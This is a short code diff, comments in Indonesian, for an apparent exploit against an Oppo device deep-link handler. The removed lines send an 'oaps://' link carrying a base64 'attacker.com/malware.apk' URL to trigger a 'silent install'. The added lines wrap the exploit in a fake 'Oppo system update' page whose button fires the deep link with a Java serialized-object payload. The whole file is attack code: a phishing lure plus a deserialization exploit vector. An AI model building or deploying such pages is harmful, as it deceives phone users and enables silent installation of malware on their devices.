@@ -1,11 +1,22 @@
-<script>
-    // Ini adalah simulasi URL APK yang ingin "diinstal"
-    const targetApk = "https://attacker.com/malware.apk";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Update Oppo</title>
+</head>
+<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>Pembaruan Komponen Sistem Tersedia</h2>
+    <p>Silakan klik tombol di bawah untuk memulai pembaruan keamanan.</p>
     
-    // Kita bungkus ke dalam parameter OAPS
-    // cb:s: berarti kita memberitahu sistem ini adalah 'string' yang harus di-deserialisasi
-    const intentUrl = "oaps://add?ckey=update_system&cb=s:" + btoa(targetApk);
+    <button id="updateBtn" style="padding: 15px 30px; font-size: 18px; color: white; background-color: #008f39; border: none; border-radius: 5px; cursor: pointer;">
+        Update Sekarang
+    </button>
 
-    console.log("Memicu serangan Silent Install...");
-    window.location.href = intentUrl;
-</script>
+    <script>
+        document.getElementById('updateBtn').onclick = function() {
+            // Ini adalah Deep Link yang mengarah ke celah keamanan
+            const intentUrl = "oaps://add?ckey=test&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
+            window.location.href = intentUrl;
+        };
+    </script>
+</body>
+</html>
